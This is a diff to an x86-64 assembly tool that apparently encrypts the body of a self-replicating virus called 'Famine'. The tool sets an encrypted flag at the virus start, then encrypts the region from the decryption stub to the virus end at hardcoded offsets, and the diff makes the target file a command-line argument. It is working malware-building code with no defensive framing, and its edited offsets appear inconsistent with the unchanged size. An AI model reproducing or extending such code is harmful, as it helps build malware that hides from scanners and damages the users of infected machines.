@@ -14,14 +14,15 @@
 %define KEY_SIZE        16
 
 section .data
-    famine_path:    db "Famine", 0
     msg_success:    db "Encrypted successfully", 10, 0
     msg_error:      db "Error", 10, 0
+    msg_usage:      db "Usage: ./encrypt <filename>", 10, 0
 
 section .bss
     key_buffer:     resb KEY_SIZE
     file_buffer:    resb 65536
     file_size:      resq 1
+    filename_ptr:   resq 1
 
 section .text
 global _start
@@ -107,9 +108,19 @@ encrypt_buffer:
     ret
 
 _start:
+    ; Check for command-line argument
+    ; Stack: [rsp] = argc, [rsp+8] = argv[0], [rsp+16] = argv[1]
+    pop rax             ; argc
+    cmp rax, 2
+    jne usage_error
+    
+    pop rax             ; argv[0] - discard
+    pop rax             ; argv[1] - filename
+    mov [rel filename_ptr], rax
+    
     ; Open file
     mov eax, 2
-    lea rdi, [rel famine_path]
+    mov rdi, [rel filename_ptr]
     mov esi, O_RDWR
     syscall
     test rax, rax
@@ -157,10 +168,10 @@ _start:
     ; Set encrypted flag at virus_start + 24 = 0x13de
     mov byte [rdi], 1
     
-    ; Encrypt from decrypt_code.end (0x1522) to virus_end (0x1b59)
+    ; Encrypt from decrypt_code.end (0x1523)
     lea rdi, [rel file_buffer]
-    add rdi, 0x1522
-    mov rsi, 0x637      ; Size: virus_end - decrypt_code.end
+    add rdi, 0x1523
+    mov rsi, 0x637
     call encrypt_buffer
     
     ; Write back
@@ -185,6 +196,13 @@ _start:
     
     mov eax, 60
     xor edi, edi
+    syscall
+
+usage_error:
+    lea rdi, [rel msg_usage]
+    call print_str
+    mov eax, 60
+    mov edi, 1
     syscall
 
 error:
